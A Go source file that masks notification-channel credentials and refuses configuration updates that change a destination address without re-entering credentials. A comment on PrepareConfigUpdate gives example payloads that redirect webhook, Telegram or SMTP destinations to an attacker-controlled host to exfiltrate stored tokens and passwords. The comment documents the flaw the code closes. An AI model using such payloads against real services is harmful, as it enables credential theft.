package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix is the marker prefix of a masked value. When the API echoes a credential back it is
// replaced by a value carrying this prefix, and the update endpoint reads such a value as "keep the stored value unchanged".
//
// A prefix is used rather than an empty string or a fixed constant so that a little identifying
// information can ride along (see MaskedValue), letting the user tell "which bot this is" without re-pasting the secret.
const MaskedPrefix = "__masked__"

// MaskedValue produces a masked value:
//
//	"__masked__"              the original is too short to hint at anything
//	"__masked__:...ab12cd"    carrying the last 6 characters as an identifying hint
//
// Exposing only the last 6 characters is a deliberate choice: the identifying part of a webhook address
// is at the end (WeCom's key, Feishu's bot id), while the prefix is the same for every bot and
// identifies nothing. Six characters are not enough to reconstruct the credential but are enough for the operator to recognize "that is my group".
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":..." + secret[len(secret)-6:]
}

// IsMasked reports whether a value is a masked one (i.e. unchanged since the API echoed it back).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig returns a copy of the configuration with the channel's credential fields replaced by masked values.
//
// An unknown channel type returns an empty map rather than the original configuration -- better for the
// UI to show "configuration unavailable" than to return potentially credential-bearing content wholesale
// when the channel type cannot be identified.
// Non-credential fields are kept as-is so the UI can still display them.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// A nested structure such as headers is treated as a single credential: deciding sub-key by
		// sub-key would require every channel to declare another set of "which sub-keys are credentials" rules, far more complexity than it is worth.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials means "the destination address changed, but the caller said
// nothing about the credential fields". It is returned rather than silently allowing it or silently dropping the credential; see PrepareConfigUpdate for why.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // destination keys that changed
	Missing []string // credential keys with no explicit statement
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "the destination address (" + strings.Join(e.Changed, ", ") + ") changed, so the credential fields (" +
		strings.Join(e.Missing, ", ") + ") must be re-entered as well: supply a new value, or explicitly leave it empty to indicate no credential is needed. " +
		"The original credential is only valid for the old address, so carrying it over means handing it to the new one."
}

// PrepareConfigUpdate merges a channel configuration and handles the security-sensitive "the destination address changed" case.
//
// It replaces a bare MergeConfig on the channel update path and closes this demonstrably exploitable
// path: the destination (where messages go) and the credential (what identity sends them) are two
// independent sets of fields, while MergeConfig keeps the stored value for every key it is not told
// about. So anyone who can PATCH a channel only has to **change the address and say nothing about the
// credential** to make the server send the stored real credential to an endpoint they control:
//
//	webhook  {config:{url:"https://attacker.tld"}}  -> the original Authorization header goes out with the request
//	telegram {config:{base_url:"https://attacker.tld"}} -> /bot<real token>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    -> the username and password are handed over after STARTTLS
//
// The path is completely silent and does not rely on a redirect (so refusing cross-host hops does not
// stop it), and it defeats the very purpose of this package's masking -- "credentials are never echoed to the browser".
//
// The rule: as soon as a destination key is changed to a new value, the caller must make an explicit statement about **every** credential key:
//   - supply a new value -> the new value is used
//   - explicitly pass an empty string -> that field no longer needs a credential (the clearing semantics are preserved)
//   - echo the masked value back / omit the key entirely -> rejected
//
// The third case is rejected because "masked value" means exactly "carry the old credential over", and
// the old credential is only valid for the old address. "Silently dropping the credential" is
// deliberately not done -- for optional credential fields (a webhook's headers, email's password) that
// would silently become "authentication is gone but the endpoint returns 200", which is harder to diagnose than an error.
// Better to make the operator fill it in once more.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("channel type %q is not registered", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// If a non-string credential value (a webhook's headers is an object) has a masked literal nested
	// inside it, the caller has pushed the "keep the original" sentinel into the middle of a structure.
	// MergeConfig only recognizes "a string with the prefix" as masked, so this shape would be stored as an
	// ordinary object -- the literal "__masked__" really does land in the database, after which
	// authentication silently fails with no error at all. Better to reject it.
	//
	// This check must come **first**: when the address has not changed the function returns early, so
	// putting it later would only cover the "address changed" path (the first version made exactly that mistake and the tests caught it).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Find the destination keys that really changed. A masked value counts as "unchanged".
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// The address did not change, so do an ordinary merge (masked keeps the original, an empty string clears, everything else overwrites).
		return MergeConfig(stored, incoming), nil
	}

	// The address changed: require an explicit statement for every credential key.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers refuses a masked sentinel submitted nested inside a non-string structure.
//
// The masking mechanism assumes "the whole value is a string". An object field such as a webhook's
// headers can only be masked as a whole (written as the string "__masked__") or submitted as a whole;
// pushing the sentinel inside the object neither expresses "keep unchanged" nor avoids being stored as a real value.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("the content of field %s contains the mask marker %q: this field can only be left empty as a whole to carry the old value over, or submitted as a whole with a new value; a mask placeholder cannot be smuggled inside the structure",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue compares two configuration values for equivalence. Comparing via JSON serialization
// also handles type drift -- the frontend submits a port as a number while the database returns a float64, and a direct == would report a false difference.
//
// "Empty" must be normalized before comparison: an empty string and "the key is absent" are the same
// state in this configuration model, because MergeConfig treats an empty string as an explicit clear
// and deletes the key. Without normalization, an optional destination field that is always left empty
// (Telegram's base_url is the only such field: empty means use the official address) would take this path --
//
//	base_url:"" is stored on creation  ->  the first save has MergeConfig delete the key
//	-> on the second save incoming is "" while stored has no key, which reads as "the address changed"
//	-> the credential is a masked value -> 400 "the destination address changed, so the credential fields must be re-entered"
//
// From then on every save fails unless the user re-pastes the bot token, having changed nothing at all.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue decides whether a configuration value is "empty".
// The rule must match MergeConfig's clearing test (strings.TrimSpace(s) == ""), or there would be a gap
// where "MergeConfig thinks it should be deleted while sameConfigValue thinks it has a value".
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig merges incoming on top of stored, for updating a channel configuration.
//
// Rules:
//   - a key whose incoming value is masked -> keep the stored value (the user did not change this field)
//   - a key whose incoming value is an empty string -> treated as an explicit clear, the key is deleted
//   - every other key -> overwritten with the incoming value
//   - a key present in stored but absent from incoming -> kept (partial update semantics)
//
// Whether an empty string counts as "clear" has to be pinned down: a frontend form submits unfilled
// fields as empty strings, and treating one as a valid value would really clear a field that was "left empty to keep the original".
// Explicit clearing is chosen here, because a user has no other way to express clearing a field they
// set wrongly (a tri-state could distinguish "not provided" from "provided empty", but the UI has no use for that distinction).
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // masked value = unchanged, keep stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
